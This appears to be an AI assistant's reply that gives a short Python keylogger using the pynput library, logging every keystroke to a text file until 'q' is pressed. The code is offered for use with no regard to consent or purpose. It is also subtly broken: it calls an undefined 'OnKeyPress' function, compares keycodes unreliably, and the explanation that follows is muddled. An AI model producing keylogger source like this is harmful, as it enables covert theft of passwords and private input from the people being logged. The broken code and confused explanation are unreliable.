Here is the Python code using pynput library to create a keylogger:

```python
from pynput.keyboard import Listener, KeyCode
import time

# Define where you want to save your log file
file_name = "log.txt"

# Define a function that will be called everytime a key is pressed

def onKeyPress(key):
    
    with open(file_name,"a") as f:

        if KeyCode(char='q').keycode == key.keycode:   # If 'q' is pressed, exit the program 
            return False
        else:
            f.write(str(key) + " ")  # write that key to log file

with Listener(on_press=OnKeyPress) as listener:       # initialize Listener and start event handlers
    listener.join()
```
Please note, that the pynput is a cross platform Python class for handling user input from keyboard, mouse, joystick devices etc using an observer pattern that uses callbacks.

To stop logging keys, just press the 'q' key. Remember to handle your error when you try to run this script using any IDE or terminal. If it doesn't open a new tab for you to write and save python code/script on it, check whether the program installed correctly, is compatible with your version of Python, etc.

For this code, we simply read each key pressed and append them to our log file "log.txt" in every line separated by space. The 'q' key is also mapped as one of the termination condition for the key logger.